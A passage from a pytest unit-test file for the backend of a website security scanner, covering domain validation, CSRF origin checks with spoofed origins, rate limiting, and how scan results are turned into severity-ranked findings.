"""
test_backend.py — unit tests for ContrastScan backend logic

Tests with controlled/mock data — no network dependency:
  - Domain validation and cleaning
  - CSRF origin checking
  - Rate limiting logic
  - Grade color mapping
  - enrich_with_findings (all 7 module combinations)
  - Client IP extraction
  - Edge cases and error handling

Run: cd app && python -m pytest tests/test_backend.py -v
"""

import pytest
from unittest.mock import patch
from fastapi import HTTPException

from validation import clean_domain, validate_domain, is_private_ip
from validation import check_csrf as _check_csrf
from validation import get_client_ip as _get_client_ip
from validation import SCAN_ID_PATTERN
from config import GRADE_COLORS, ALLOWED_ORIGINS, ERROR_MESSAGES, DOMAIN_LIMIT
from ratelimit import check_domain_limit
from findings import enrich_with_findings, is_enterprise_domain as _is_enterprise_domain

from conftest import FakeRequest, make_scan_result


# === Domain validation ===

class TestCleanDomain:
    def test_strips_whitespace(self):
        assert clean_domain("  example.com  ") == "example.com"

    def test_lowercases(self):
        assert clean_domain("EXAMPLE.COM") == "example.com"

    def test_strips_https(self):
        assert clean_domain("https://example.com") == "example.com"

    def test_strips_http(self):
        assert clean_domain("http://example.com") == "example.com"

    def test_strips_path(self):
        assert clean_domain("https://example.com/path/to") == "example.com"

    def test_strips_port(self):
        assert clean_domain("example.com:8080") == "example.com"

    def test_strips_path_and_port(self):
        assert clean_domain("https://example.com:443/foo") == "example.com"

    def test_empty_string(self):
        assert clean_domain("") == ""

    def test_no_scheme(self):
        assert clean_domain("example.com") == "example.com"

    def test_subdomain_preserved(self):
        assert clean_domain("www.example.com") == "www.example.com"

    def test_trailing_slash(self):
        assert clean_domain("example.com/") == "example.com"

    def test_mixed_case_scheme(self):
        assert clean_domain("HTTPS://Example.COM/Page") == "example.com"


class TestPrivateIp:
    @pytest.mark.parametrize("ip", [
        "127.0.0.1", "10.0.0.1", "192.168.1.1", "172.16.0.1",
        "169.254.1.1", "0.0.0.0", "::1", "255.255.255.255",
    ])
    def test_private_ips(self, ip):
        assert is_private_ip(ip) is True

    @pytest.mark.parametrize("ip", ["8.8.8.8", "1.1.1.1"])
    def test_public_ips(self, ip):
        assert is_private_ip(ip) is False

    def test_invalid_string_is_private(self):
        assert is_private_ip("not-an-ip") is True

    def test_empty_string_is_private(self):
        assert is_private_ip("") is True


# === Grade colors ===

class TestGradeColors:
    def test_a_is_green(self):
        assert GRADE_COLORS["A"] == "#22c55e"

    def test_b_is_lime(self):
        assert GRADE_COLORS["B"] == "#84cc16"

    def test_c_is_yellow(self):
        assert GRADE_COLORS["C"] == "#eab308"

    def test_d_is_orange(self):
        assert GRADE_COLORS["D"] == "#f97316"

    def test_f_is_red(self):
        assert GRADE_COLORS["F"] == "#ef4444"

    def test_all_5_grades_present(self):
        assert len(GRADE_COLORS) == 5


# === CSRF checking ===

class TestCsrf:
    def test_allows_contrastcyber_origin(self):
        req = FakeRequest(headers={"origin": "https://contrastcyber.com"})
        _check_csrf(req)  # should not raise

    def test_allows_www_contrastcyber_origin(self):
        req = FakeRequest(headers={"origin": "https://www.contrastcyber.com"})
        _check_csrf(req)  # should not raise

    def test_blocks_no_origin_no_referer(self):
        """Missing both Origin and Referer is now blocked."""
        req = FakeRequest(headers={})
        with pytest.raises(HTTPException) as exc:
            _check_csrf(req)
        assert exc.value.status_code == 403

    def test_blocks_evil_origin(self):
        req = FakeRequest(headers={"origin": "https://evil.com"})
        with pytest.raises(HTTPException) as exc_info:
            _check_csrf(req)
        assert exc_info.value.status_code == 403

    def test_blocks_subdomain_spoof(self):
        req = FakeRequest(headers={"origin": "https://contrastcyber.com.evil.com"})
        with pytest.raises(HTTPException) as exc_info:
            _check_csrf(req)
        assert exc_info.value.status_code == 403

    def test_blocks_http_origin(self):
        req = FakeRequest(headers={"origin": "http://contrastcyber.com"})
        with pytest.raises(HTTPException) as exc_info:
            _check_csrf(req)
        assert exc_info.value.status_code == 403


# === Client IP extraction ===

class TestClientIp:
    def test_x_real_ip_priority(self):
        req = FakeRequest(headers={"x-real-ip": "1.2.3.4"}, client_host="127.0.0.1")
        assert _get_client_ip(req) == "1.2.3.4"

    def test_x_forwarded_for_first_ip(self):
        req = FakeRequest(headers={"x-forwarded-for": "5.6.7.8, 10.0.0.1"}, client_host="127.0.0.1")
        assert _get_client_ip(req) == "5.6.7.8"

    def test_x_real_ip_over_x_forwarded_for(self):
        req = FakeRequest(
            headers={"x-real-ip": "1.2.3.4", "x-forwarded-for": "5.6.7.8"},
            client_host="127.0.0.1"
        )
        assert _get_client_ip(req) == "1.2.3.4"

    def test_fallback_to_client_host(self):
        req = FakeRequest(headers={}, client_host="9.8.7.6")
        assert _get_client_ip(req) == "9.8.7.6"

    def test_strips_whitespace_from_x_real_ip(self):
        req = FakeRequest(headers={"x-real-ip": "  1.2.3.4  "}, client_host="127.0.0.1")
        assert _get_client_ip(req) == "1.2.3.4"


# === Rate limiting ===

class TestRateLimiting:
    def test_domain_limit_allows(self):
        test_domain = "test-domain.com"
        for i in range(DOMAIN_LIMIT):
            result = check_domain_limit(test_domain)
        assert result is True

    def test_domain_limit_blocks(self):
        test_domain = "test-domain-block.com"
        for i in range(DOMAIN_LIMIT):
            check_domain_limit(test_domain)
        assert check_domain_limit(test_domain) is False

    def test_separate_limits_per_domain(self):
        check_domain_limit("domain-a.com")
        assert check_domain_limit("domain-b.com") is True


# === enrich_with_findings ===

class TestEnrichPerfect:
    def test_findings_list_exists(self):
        enriched = enrich_with_findings(make_scan_result())
        assert "findings" in enriched

    def test_findings_count_exists(self):
        enriched = enrich_with_findings(make_scan_result())
        assert "findings_count" in enriched

    def test_zero_findings_for_perfect_score(self):
        enriched = enrich_with_findings(make_scan_result())
        assert len(enriched["findings"]) == 0

    def test_zero_critical(self):
        enriched = enrich_with_findings(make_scan_result())
        assert enriched["findings_count"]["critical"] == 0

    def test_zero_high(self):
        enriched = enrich_with_findings(make_scan_result())
        assert enriched["findings_count"]["high"] == 0

    def test_zero_medium(self):
        enriched = enrich_with_findings(make_scan_result())
        assert enriched["findings_count"]["medium"] == 0

    def test_zero_low(self):
        enriched = enrich_with_findings(make_scan_result())
        assert enriched["findings_count"]["low"] == 0


class TestEnrichMissingHeaders:
    def test_two_header_findings(self):
        result = make_scan_result(headers_missing=[
            "content-security-policy", "strict-transport-security",
        ])
        enriched = enrich_with_findings(result)
        header_findings = [f for f in enriched["findings"] if f["category"] == "headers"]
        assert len(header_findings) == 2

    def test_csp_finding_present(self):
        result = make_scan_result(headers_missing=[
            "content-security-policy", "strict-transport-security",
        ])
        enriched = enrich_with_findings(result)
        header_findings = [f for f in enriched["findings"] if f["category"] == "headers"]
        csp = [f for f in header_findings if f.get("header") == "content-security-policy"]
        assert len(csp) == 1

    def test_csp_severity_high(self):
        result = make_scan_result(headers_missing=[
            "content-security-policy", "strict-transport-security",
        ])
        enriched = enrich_with_findings(result)
        header_findings = [f for f in enriched["findings"] if f["category"] == "headers"]
        csp = [f for f in header_findings if f.get("header") == "content-security-policy"]
        assert csp[0]["severity"] == "high"

    def test_hsts_finding_present(self):
        result = make_scan_result(headers_missing=[
            "content-security-policy", "strict-transport-security",
        ])
        enriched = enrich_with_findings(result)
        header_findings = [f for f in enriched["findings"] if f["category"] == "headers"]
        hsts = [f for f in header_findings if f.get("header") == "strict-transport-security"]
        assert len(hsts) == 1

    def test_hsts_severity_high(self):
        result = make_scan_result(headers_missing=[
            "content-security-policy", "strict-transport-security",
        ])
        enriched = enrich_with_findings(result)
        header_findings = [f for f in enriched["findings"] if f["category"] == "headers"]
        hsts = [f for f in header_findings if f.get("header") == "strict-transport-security"]
        assert hsts[0]["severity"] == "high"


class TestEnrichAllHeadersMissing:
    def test_six_header_findings(self):
        result = make_scan_result(headers_missing=[
            "content-security-policy", "strict-transport-security",
            "x-content-type-options", "x-frame-options",
            "referrer-policy", "permissions-policy",
        ])
        enriched = enrich_with_findings(result)
        header_findings = [f for f in enriched["findings"] if f["category"] == "headers"]
        assert len(header_findings) == 6

    def test_two_high_severity_headers(self):
        result = make_scan_result(headers_missing=[
            "content-security-policy", "strict-transport-security",
            "x-content-type-options", "x-frame-options",
            "referrer-policy", "permissions-policy",
        ])
        enriched = enrich_with_findings(result)
        header_findings = [f for f in enriched["findings"] if f["category"] == "headers"]
        severities = [f["severity"] for f in header_findings]
        assert severities.count("high") == 2

    def test_two_medium_severity_headers(self):
        result = make_scan_result(headers_missing=[
            "content-security-policy", "strict-transport-security",
            "x-content-type-options", "x-frame-options",
            "referrer-policy", "permissions-policy",
        ])
        enriched = enrich_with_findings(result)
        header_findings = [f for f in enriched["findings"] if f["category"] == "headers"]
        severities = [f["severity"] for f in header_findings]
        assert severities.count("medium") == 2

    def test_two_low_severity_headers(self):
        result = make_scan_result(headers_missing=[
            "content-security-policy", "strict-transport-security",
            "x-content-type-options", "x-frame-options",
            "referrer-policy", "permissions-policy",
        ])
        enriched = enrich_with_findings(result)
        header_findings = [f for f in enriched["findings"] if f["category"] == "headers"]
        severities = [f["severity"] for f in header_findings]
        assert severities.count("low") == 2


class TestEnrichSslError:
    def test_ssl_finding_present(self):
        result = make_scan_result(ssl_error="connection refused")
        enriched = enrich_with_findings(result)
        ssl_findings = [f for f in enriched["findings"] if f["category"] == "ssl"]
        assert len(ssl_findings) >= 1

    def test_ssl_error_medium(self):
        result = make_scan_result(ssl_error="connection refused")
        enriched = enrich_with_findings(result)
        ssl_findings = [f for f in enriched["findings"] if f["category"] == "ssl"]
        assert ssl_findings[0]["severity"] == "medium"

    def test_description_mentions_error(self):
        result = make_scan_result(ssl_error="connection refused")
        enriched = enrich_with_findings(result)
        ssl_findings = [f for f in enriched["findings"] if f["category"] == "ssl"]
        assert "connection refused" in ssl_findings[0]["description"]

    def test_tcp_connection_failed_is_info(self):
        result = make_scan_result(ssl_error="TCP connection failed")
        enriched = enrich_with_findings(result)
        ssl_findings = [f for f in enriched["findings"] if f["category"] == "ssl"]
        assert len(ssl_findings) == 1
        assert ssl_findings[0]["severity"] == "info"
        assert "port 443" in ssl_findings[0]["description"]

    def test_connection_reset_is_info(self):
        result = make_scan_result(ssl_error="Connection reset during TLS handshake")
        enriched = enrich_with_findings(result)
        ssl_findings = [f for f in enriched["findings"] if f["category"] == "ssl"]
        assert len(ssl_findings) == 1
        assert ssl_findings[0]["severity"] == "info"
        assert "reset" in ssl_findings[0]["description"].lower()

    def test_connection_reset_excludes_ssl_from_score(self):
        result = make_scan_result(ssl_error="Connection reset during TLS handshake")
        result["total_score"] = 50
        result["max_score"] = 100
        result["grade"] = "C"
        enriched = enrich_with_findings(result)
        assert enriched["ssl"]["max"] == 0
        assert enriched["max_score"] == 75

    def test_tls_cert_error_is_critical(self):
        result = make_scan_result(ssl_error="TLS handshake failed: certificate verify failed")
        enriched = enrich_with_findings(result)
        ssl_findings = [f for f in enriched["findings"] if f["category"] == "ssl"]
        assert ssl_findings[0]["severity"] == "critical"

    def test_tls_generic_error_is_medium(self):
        result = make_scan_result(ssl_error="TLS handshake failed")
        enriched = enrich_with_findings(result)
        ssl_findings = [f for f in enriched["findings"] if f["category"] == "ssl"]
        assert ssl_findings[0]["severity"] == "medium"

    def test_tcp_failed_excludes_ssl_from_score(self):
        result = make_scan_result(ssl_error="TCP connection failed")
        result["total_score"] = 50
        result["max_score"] = 100
        result["grade"] = "C"
        enriched = enrich_with_findings(result)
        assert enriched["ssl"]["max"] == 0
        assert enriched["max_score"] == 75
        assert enriched["total_score"] == 50
        # 50/75 = 66% → grade C
        assert enriched["grade"] == "C"

    def test_tcp_failed_score_exclusion_improves_grade(self):
        result = make_scan_result(ssl_error="TCP connection failed")
        result["total_score"] = 70
        result["max_score"] = 100
        result["grade"] = "C"
        enriched = enrich_with_findings(result)
        # 70/75 = 93% → grade A
        assert enriched["grade"] == "A"


class TestEnrichWeakTls:
    def test_tls_11_finding_present(self):
        result = make_scan_result(tls_version="TLSv1.1")
        enriched = enrich_with_findings(result)
        ssl_findings = [f for f in enriched["findings"] if f["category"] == "ssl"]
        tls_finding = [f for f in ssl_findings if "deprecated" in f["description"]]
        assert len(tls_finding) == 1

    def test_tls_11_high_severity(self):
        result = make_scan_result(tls_version="TLSv1.1")
        enriched = enrich_with_findings(result)
        ssl_findings = [f for f in enriched["findings"] if f["category"] == "ssl"]
        tls_finding = [f for f in ssl_findings if "deprecated" in f["description"]]
        assert tls_finding[0]["severity"] == "high"


class TestEnrichExpiredCert:
    def test_expired_cert_finding_present(self):
        result = make_scan_result(cert_valid=False, days_remaining=-10)
        enriched = enrich_with_findings(result)
        ssl_findings = [f for f in enriched["findings"] if f["category"] == "ssl"]
        cert_finding = [f for f in ssl_findings if "expired" in f["description"].lower()]
        assert len(cert_finding) >= 1

    def test_expired_cert_high_severity(self):
        result = make_scan_result(cert_valid=False, days_remaining=-10)
        enriched = enrich_with_findings(result)
        ssl_findings = [f for f in enriched["findings"] if f["category"] == "ssl"]
        cert_finding = [f for f in ssl_findings if "expired" in f["description"].lower()]
        assert cert_finding[0]["severity"] == "high"


class TestEnrichSelfSigned:
    def test_chain_invalid_finding_present(self):
        result = make_scan_result(chain_valid=False)
        enriched = enrich_with_findings(result)
        ssl_findings = [f for f in enriched["findings"] if f["category"] == "ssl"]
        chain_finding = [f for f in ssl_findings if "chain" in f["description"].lower()]
        assert len(chain_finding) >= 1

    def test_chain_invalid_critical(self):
        result = make_scan_result(chain_valid=False)
        enriched = enrich_with_findings(result)
        ssl_findings = [f for f in enriched["findings"] if f["category"] == "ssl"]
        chain_finding = [f for f in ssl_findings if "chain" in f["description"].lower()]
        assert chain_finding[0]["severity"] == "critical"

    def test_no_expiring_soon_when_chain_invalid(self):
        result = make_scan_result(chain_valid=False)
        enriched = enrich_with_findings(result)
        ssl_findings = [f for f in enriched["findings"] if f["category"] == "ssl"]
        cert_finding = [f for f in ssl_findings if "expiring" in f["description"].lower()]
        assert len(cert_finding) == 0


class TestEnrichWeakCipher:
    def test_weak_cipher_finding_present(self):
        result = make_scan_result(cipher="DES-CBC3-SHA", cipher_score=2)
        enriched = enrich_with_findings(result)
        ssl_findings = [f for f in enriched["findings"] if f["category"] == "ssl"]
        cipher_finding = [f for f in ssl_findings if "cipher" in f["description"].lower()]
        assert len(cipher_finding) >= 1

    def test_weak_cipher_medium(self):
        result = make_scan_result(cipher="DES-CBC3-SHA", cipher_score=2)
        enriched = enrich_with_findings(result)
        ssl_findings = [f for f in enriched["findings"] if f["category"] == "ssl"]
        cipher_finding = [f for f in ssl_findings if "cipher" in f["description"].lower()]
        assert cipher_finding[0]["severity"] == "medium"


class TestEnrichDnsMissing:
    def test_three_dns_findings(self):
        result = make_scan_result(spf=False, dmarc=False, dkim=False)
        enriched = enrich_with_findings(result)
        dns_findings = [f for f in enriched["findings"] if f["category"] == "dns"]
        assert len(dns_findings) == 3

    def test_spf_finding_high(self):
        result = make_scan_result(spf=False, dmarc=False, dkim=False)
        enriched = enrich_with_findings(result)
        dns_findings = [f for f in enriched["findings"] if f["category"] == "dns"]
        spf_f = [f for f in dns_findings if "SPF" in f["description"]]
        assert spf_f[0]["severity"] == "high"

    def test_dmarc_finding_high(self):
        result = make_scan_result(spf=False, dmarc=False, dkim=False)
        enriched = enrich_with_findings(result)
        dns_findings = [f for f in enriched["findings"] if f["category"] == "dns"]
        dmarc_f = [f for f in dns_findings if "DMARC" in f["description"]]
        assert dmarc_f[0]["severity"] == "high"

    def test_dkim_finding_medium(self):
        result = make_scan_result(spf=False, dmarc=False, dkim=False)
        enriched = enrich_with_findings(result)
        dns_findings = [f for f in enriched["findings"] if f["category"] == "dns"]
        dkim_f = [f for f in dns_findings if "DKIM" in f["description"]]
        assert dkim_f[0]["severity"] == "medium"


class TestEnrichNoRedirect:
    def test_redirect_finding_present(self):
        result = make_scan_result(redirects_to_https=False)
        enriched = enrich_with_findings(result)
        redir_findings = [f for f in enriched["findings"] if f["category"] == "redirect"]
        assert len(redir_findings) == 1

    def test_redirect_high(self):
        result = make_scan_result(redirects_to_https=False)
        enriched = enrich_with_findings(result)
        redir_findings = [f for f in enriched["findings"] if f["category"] == "redirect"]
        assert redir_findings[0]["severity"] == "high"


class TestEnrichDisclosure:
    def test_powered_by_finding_present(self):
        result = make_scan_result(
            powered_by_exposed=True, powered_by_value="Express",
            server_exposed=True, server_value="nginx"
        )
        enriched = enrich_with_findings(result)
        disc_findings = [f for f in enriched["findings"] if f["category"] == "disclosure"]
        assert len(disc_findings) >= 1

    def test_powered_by_medium(self):
        result = make_scan_result(
            powered_by_exposed=True, powered_by_value="Express",
            server_exposed=True, server_value="nginx"
        )
        enriched = enrich_with_findings(result)
        disc_findings = [f for f in enriched["findings"] if f["category"] == "disclosure"]
        assert any(f["severity"] == "medium" for f in disc_findings)

    def test_description_mentions_express(self):
        result = make_scan_result(
            powered_by_exposed=True, powered_by_value="Express",
            server_exposed=True, server_value="nginx"
        )
        enriched = enrich_with_findings(result)
        disc_findings = [f for f in enriched["findings"] if f["category"] == "disclosure"]
        assert any("Express" in f["description"] for f in disc_findings)

    def test_server_only_finding_present(self):
        result = make_scan_result(server_exposed=True, server_value="gunicorn")
        enriched = enrich_with_findings(result)
        disc_findings = [f for f in enriched["findings"] if f["category"] == "disclosure"]
        assert len(disc_findings) == 1

    def test_server_only_low(self):
        result = make_scan_result(server_exposed=True, server_value="gunicorn")
        enriched = enrich_with_findings(result)
        disc_findings = [f for f in enriched["findings"] if f["category"] == "disclosure"]
        assert disc_findings[0]["severity"] == "low"

    def test_no_finding_when_hidden(self):
        result = make_scan_result()
        enriched = enrich_with_findings(result)
        disc_findings = [f for f in enriched["findings"] if f["category"] == "disclosure"]
        assert len(disc_findings) == 0


class TestEnrichCookies:
    def test_cookie_finding_present(self):
        result = make_scan_result(
            cookies_found=2, all_secure=False, all_httponly=True, all_samesite=False
        )
        enriched = enrich_with_findings(result)
        cookie_findings = [f for f in enriched["findings"] if f["category"] == "cookies"]
        assert len(cookie_findings) == 1

    def test_cookie_medium(self):
        result = make_scan_result(
            cookies_found=2, all_secure=False, all_httponly=True, all_samesite=False
        )
        enriched = enrich_with_findings(result)
        cookie_findings = [f for f in enriched["findings"] if f["category"] == "cookies"]
        assert cookie_findings[0]["severity"] == "medium"

    def test_mentions_secure(self):
        result = make_scan_result(
            cookies_found=2, all_secure=False, all_httponly=True, all_samesite=False
        )
        enriched = enrich_with_findings(result)
        cookie_findings = [f for f in enriched["findings"] if f["category"] == "cookies"]
        assert "Secure" in cookie_findings[0]["description"]

    def test_mentions_samesite(self):
        result = make_scan_result(
            cookies_found=2, all_secure=False, all_httponly=True, all_samesite=False
        )
        enriched = enrich_with_findings(result)
        cookie_findings = [f for f in enriched["findings"] if f["category"] == "cookies"]
        assert "SameSite" in cookie_findings[0]["description"]

    def test_does_not_mention_httponly(self):
        result = make_scan_result(
            cookies_found=2, all_secure=False, all_httponly=True, all_samesite=False
        )
        enriched = enrich_with_findings(result)
        cookie_findings = [f for f in enriched["findings"] if f["category"] == "cookies"]
        assert "HttpOnly" not in cookie_findings[0]["description"]

    def test_no_finding_when_all_flags_set(self):
        result = make_scan_result(cookies_found=1)
        enriched = enrich_with_findings(result)
        cookie_findings = [f for f in enriched["findings"] if f["category"] == "cookies"]
        assert len(cookie_findings) == 0

    def test_no_finding_when_no_cookies(self):
        result = make_scan_result(cookies_found=0)
        enriched = enrich_with_findings(result)
        cookie_findings = [f for f in enriched["findings"] if f["category"] == "cookies"]
        assert len(cookie_findings) == 0


class TestEnrichDnssec:
    def test_dnssec_finding_present(self):
        result = make_scan_result(dnssec_enabled=False)
        enriched = enrich_with_findings(result)
        dnssec_findings = [f for f in enriched["findings"] if f["category"] == "dnssec"]
        assert len(dnssec_findings) == 1

    def test_dnssec_low(self):
        result = make_scan_result(dnssec_enabled=False)
        enriched = enrich_with_findings(result)
        dnssec_findings = [f for f in enriched["findings"] if f["category"] == "dnssec"]
        assert dnssec_findings[0]["severity"] == "low"

    def test_no_finding_when_enabled(self):
        result = make_scan_result(dnssec_enabled=True)
        enriched = enrich_with_findings(result)
        dnssec_findings = [f for f in enriched["findings"] if f["category"] == "dnssec"]
        assert len(dnssec_findings) == 0


class TestEnrichMethods:
    def test_trace_finding_present(self):
        result = make_scan_result(trace_enabled=True)
        enriched = enrich_with_findings(result)
        method_findings = [f for f in enriched["findings"] if f["category"] == "methods"]
        assert len(method_findings) >= 1

    def test_trace_high(self):
        result = make_scan_result(trace_enabled=True)
        enriched = enrich_with_findings(result)
        method_findings = [f for f in enriched["findings"] if f["category"] == "methods"]
        trace = [f for f in method_findings if "TRACE" in f["description"]]
        assert trace[0]["severity"] == "high"

    def test_delete_put_finding_present(self):
        result = make_scan_result(delete_enabled=True, put_enabled=True)
        enriched = enrich_with_findings(result)
        method_findings = [f for f in enriched["findings"] if f["category"] == "methods"]
        dangerous = [f for f in method_findings if "DELETE" in f["description"]]
        assert len(dangerous) == 1

    def test_delete_put_medium(self):
        result = make_scan_result(delete_enabled=True, put_enabled=True)
        enriched = enrich_with_findings(result)
        method_findings = [f for f in enriched["findings"] if f["category"] == "methods"]
        dangerous = [f for f in method_findings if "DELETE" in f["description"]]
        assert dangerous[0]["severity"] == "medium"

    def test_delete_only_finding(self):
        result = make_scan_result(delete_enabled=True)
        enriched = enrich_with_findings(result)
        method_findings = [f for f in enriched["findings"] if f["category"] == "methods"]
        assert len(method_findings) == 1
        assert "DELETE" in method_findings[0]["description"]

    def test_put_only_finding(self):
        result = make_scan_result(put_enabled=True)
        enriched = enrich_with_findings(result)
        method_findings = [f for f in enriched["findings"] if f["category"] == "methods"]
        assert len(method_findings) == 1
        assert "PUT" in method_findings[0]["description"]

    def test_no_finding_when_all_disabled(self):
        result = make_scan_result()
        enriched = enrich_with_findings(result)
        method_findings = [f for f in enriched["findings"] if f["category"] == "methods"]
        assert len(method_findings) == 0

    def test_trace_and_delete_two_findings(self):
        result = make_scan_result(trace_enabled=True, delete_enabled=True)
        enriched = enrich_with_findings(result)
        method_findings = [f for f in enriched["findings"] if f["category"] == "methods"]
        assert len(method_findings) == 2


class TestEnrichCors:
    def test_credentials_with_wildcard_critical(self):
        result = make_scan_result(credentials_with_wildcard=True)
        enriched = enrich_with_findings(result)
        cors_findings = [f for f in enriched["findings"] if f["category"] == "cors"]
        cred = [f for f in cors_findings if "credential" in f["description"].lower()]
        assert len(cred) >= 1
        assert cred[0]["severity"] == "critical"

    def test_reflects_origin_high(self):
        result = make_scan_result(reflects_origin=True)
        enriched = enrich_with_findings(result)
        cors_findings = [f for f in enriched["findings"] if f["category"] == "cors"]
        reflect = [f for f in cors_findings if "reflects" in f["description"].lower()]
        assert len(reflect) >= 1
        assert reflect[0]["severity"] == "high"

    def test_wildcard_origin_medium(self):
        result = make_scan_result(wildcard_origin=True)
        enriched = enrich_with_findings(result)
        cors_findings = [f for f in enriched["findings"] if f["category"] == "cors"]
        wildcard = [f for f in cors_findings if "any origin" in f["description"].lower()]
        assert len(wildcard) >= 1
        assert wildcard[0]["severity"] == "medium"

    def test_no_finding_when_cors_clean(self):
        result = make_scan_result()
        enriched = enrich_with_findings(result)
        cors_findings = [f for f in enriched["findings"] if f["category"] == "cors"]
        assert len(cors_findings) == 0

    def test_all_cors_issues_three_findings(self):
        result = make_scan_result(
            wildcard_origin=True, reflects_origin=True, credentials_with_wildcard=True
        )
        enriched = enrich_with_findings(result)
        cors_findings = [f for f in enriched["findings"] if f["category"] == "cors"]
        assert len(cors_findings) == 3


class TestEnrichHtml:
    def test_mixed_active_high(self):
        result = make_scan_result(mixed_active=3)
        enriched = enrich_with_findings(result)
        html_findings = [f for f in enriched["findings"] if f["category"] == "html"]
        active = [f for f in html_findings if "active mixed" in f["description"].lower()]
        assert len(active) == 1
        assert active[0]["severity"] == "high"

    def test_mixed_passive_low(self):
        result = make_scan_result(mixed_passive=2)
        enriched = enrich_with_findings(result)
        html_findings = [f for f in enriched["findings"] if f["category"] == "html"]
        passive = [f for f in html_findings if "passive mixed" in f["description"].lower()]
        assert len(passive) == 1
        assert passive[0]["severity"] == "low"

    def test_inline_handlers_medium(self):
        result = make_scan_result(inline_handlers=3)
        enriched = enrich_with_findings(result)
        html_findings = [f for f in enriched["findings"] if f["category"] == "html"]
        inline = [f for f in html_findings if "inline" in f["description"].lower()]
        assert len(inline) == 1
        assert inline[0]["severity"] == "medium"

    def test_inline_scripts_over_5_medium(self):
        result = make_scan_result(inline_scripts=10)
        enriched = enrich_with_findings(result)
        html_findings = [f for f in enriched["findings"] if f["category"] == "html"]
        inline = [f for f in html_findings if "inline" in f["description"].lower()]
        assert len(inline) == 1

    def test_inline_scripts_5_no_finding(self):
        result = make_scan_result(inline_scripts=5)
        enriched = enrich_with_findings(result)
        html_findings = [f for f in enriched["findings"] if f["category"] == "html"]
        inline = [f for f in html_findings if "inline" in f["description"].lower()]
        assert len(inline) == 0

    def test_external_scripts_no_sri_medium(self):
        result = make_scan_result(external_scripts=5, external_scripts_no_sri=3)
        enriched = enrich_with_findings(result)
        html_findings = [f for f in enriched["findings"] if f["category"] == "html"]
        sri = [f for f in html_findings if "SRI" in f["description"]]
        assert len(sri) == 1
        assert sri[0]["severity"] == "medium"

    def test_forms_http_action_high(self):
        result = make_scan_result(forms_total=2, forms_http_action=1)
        enriched = enrich_with_findings(result)
        html_findings = [f for f in enriched["findings"] if f["category"] == "html"]
        forms = [f for f in html_findings if "form" in f["description"].lower()]
        assert len(forms) == 1
        assert forms[0]["severity"] == "high"

    def test_meta_set_cookie_high(self):
        result = make_scan_result(meta_set_cookie=2)
        enriched = enrich_with_findings(result)
        html_findings = [f for f in enriched["findings"] if f["category"] == "html"]
        meta = [f for f in html_findings if "Set-Cookie" in f["description"]]
        assert len(meta) == 1
        assert meta[0]["severity"] == "high"

    def test_meta_refresh_http_medium(self):
        result = make_scan_result(meta_refresh_http=1)
        enriched = enrich_with_findings(result)
        html_findings = [f for f in enriched["findings"] if f["category"] == "html"]
        refresh = [f for f in html_findings if "refresh" in f["description"].lower()]
        assert len(refresh) == 1
        assert refresh[0]["severity"] == "medium"

    def test_no_finding_when_html_clean(self):
        result = make_scan_result()
        enriched = enrich_with_findings(result)
        html_findings = [f for f in enriched["findings"] if f["category"] == "html"]
        assert len(html_findings) == 0

    def test_all_html_issues_many_findings(self):
        result = make_scan_result(
            mixed_active=1, mixed_passive=1, inline_handlers=2,
            external_scripts_no_sri=3, forms_http_action=1,
            meta_set_cookie=1, meta_refresh_http=1,
        )
        enriched = enrich_with_findings(result)
        html_findings = [f for f in enriched["findings"] if f["category"] == "html"]
        assert len(html_findings) == 7


class TestEnrichCspDeep:
    def test_unsafe_inline_medium(self):
        result = make_scan_result(unsafe_inline=True)
        enriched = enrich_with_findings(result)
        csp_findings = [f for f in enriched["findings"] if f["category"] == "csp_analysis"]
        inline = [f for f in csp_findings if "unsafe-inline" in f["description"]]
        assert len(inline) == 1
        assert inline[0]["severity"] == "medium"

    def test_unsafe_eval_high(self):
        result = make_scan_result(unsafe_eval=True)
        enriched = enrich_with_findings(result)
        csp_findings = [f for f in enriched["findings"] if f["category"] == "csp_analysis"]
        eval_f = [f for f in csp_findings if "unsafe-eval" in f["description"]]
        assert len(eval_f) == 1
        assert eval_f[0]["severity"] == "high"

    def test_wildcard_source_high(self):
        result = make_scan_result(wildcard_source=True)
        enriched = enrich_with_findings(result)
        csp_findings = [f for f in enriched["findings"] if f["category"] == "csp_analysis"]
        wildcard = [f for f in csp_findings if "wildcard" in f["description"].lower()]
        assert len(wildcard) == 1
        assert wildcard[0]["severity"] == "high"

    def test_data_uri_medium(self):
        result = make_scan_result(data_uri=True)
        enriched = enrich_with_findings(result)
        csp_findings = [f for f in enriched["findings"] if f["category"] == "csp_analysis"]
        data = [f for f in csp_findings if "data:" in f["description"]]
        assert len(data) == 1
        assert data[0]["severity"] == "medium"

    def test_no_finding_when_csp_clean(self):
        result = make_scan_result()
        enriched = enrich_with_findings(result)
        csp_findings = [f for f in enriched["findings"] if f["category"] == "csp_analysis"]
        assert len(csp_findings) == 0

    def test_all_csp_issues_four_findings(self):
        result = make_scan_result(
            unsafe_inline=True, unsafe_eval=True,
            wildcard_source=True, data_uri=True,
        )
        enriched = enrich_with_findings(result)
        csp_findings = [f for f in enriched["findings"] if f["category"] == "csp_analysis"]
        assert len(csp_findings) == 4

    def test_blob_uri_not_generating_finding(self):
        """blob_uri is tracked but does not generate a finding in current code"""
        result = make_scan_result(blob_uri=True)
        enriched = enrich_with_findings(result)
        csp_findings = [f for f in enriched["findings"] if f["category"] == "csp_analysis"]
        assert len(csp_findings) == 0


class TestEnrichSeverityOrder:
    def test_findings_sorted_by_severity(self):
        result = make_scan_result(
            headers_missing=["content-security-policy", "referrer-policy"],
            ssl_error="timeout",
            spf=False,
            redirects_to_https=False,
            dnssec_enabled=False,
        )
        enriched = enrich_with_findings(result)
        findings = enriched["findings"]
        severities = [f["severity"] for f in findings]
        order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        is_sorted = all(order[severities[i]] <= order[severities[i+1]]
                        for i in range(len(severities) - 1))
        assert is_sorted

    def test_first_finding_is_critical(self):
        result = make_scan_result(
            headers_missing=["content-security-policy", "referrer-policy"],
            ssl_error="TLS handshake failed: certificate verify failed",
            spf=False,
            redirects_to_https=False,
            dnssec_enabled=False,
        )
        enriched = enrich_with_findings(result)
        assert enriched["findings"][0]["severity"] == "critical"


class TestEnrichWorstCase:
    @pytest.fixture(autouse=True)
    def setup_worst_case(self):
        result = make_scan_result(
            headers_missing=[
                "content-security-policy", "strict-transport-security",
                "x-content-type-options", "x-frame-options",
                "referrer-policy", "permissions-policy",
            ],
            ssl_error="TLS handshake failed: certificate verify failed",
            spf=False, dmarc=False, dkim=False,
            redirects_to_https=False,
